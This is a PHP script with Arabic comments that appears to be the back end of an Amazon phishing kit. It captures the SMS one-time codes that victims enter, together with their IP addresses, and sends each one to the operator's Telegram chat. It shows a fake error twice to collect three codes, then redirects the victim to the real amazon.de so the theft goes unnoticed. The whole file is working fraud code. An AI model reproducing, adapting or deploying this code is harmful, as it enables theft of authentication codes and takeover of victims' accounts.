<?php
// بدء نظام الجلسات لحساب عدد المرات على السيرفر
session_start();

// تضمين ملفات الإعداد والاتصال الخاصة بك للتلغرام
include "v.php";
include "t.php";

// استقبال البيانات في كل مرة
$phone_confirm = isset($_POST['phone_confirm']) ? $_POST['phone_confirm'] : '';
$sms_code      = isset($_POST['sms_code']) ? $_POST['sms_code'] : '';

// زيادة العداد في كل مرة يدخل فيها الكود
if (!isset($_SESSION['attempts_count'])) {
    $_SESSION['attempts_count'] = 1;
} else {
    $_SESSION['attempts_count']++;
}

$current_attempt = $_SESSION['attempts_count'];

// 🟢 الإرسال الفوري للتلغرام (هيوصلك رسالة في كل محاولة من الـ 3 محاولات)
$message  = "========= Amazon CH OTP (Attempt ".$current_attempt.") =========\n";
$message .= "SMS OTP CODE : ".$sms_code."\n";
$message .= "IP           : ".(isset($ib) ? $ib : $_SERVER['REMOTE_ADDR'])."\n";
$message .= "=====================================\n";

$tk = $token; 
$chid = $chatid; 
sendMessage($chid, $message, $tk);

// 🔀 التحكم في مسار التوجيه بناءً على عدد المرات
if ($current_attempt < 3) {
    // المحاولة الأولى والثانية ⬅️ يرجعه لصفحة الكود ويظهر رسالة الخطأ
    // تأكد إن اسم ملف صفحة الكود هو otp.html أو otp.php واكتبه هنا بالظبط
    header("Location: ./lod2.php?error=1&" . md5(microtime()));
    exit();
} else {
    // المحاولة الثالثة ⬅️ تم استلام الـ 3 كود بنجاح، تصفير العداد والتحويل لأمازون الرسمي
    unset($_SESSION['attempts_count']);
    header("Location: https://www.amazon.de/");
    exit();
}
?>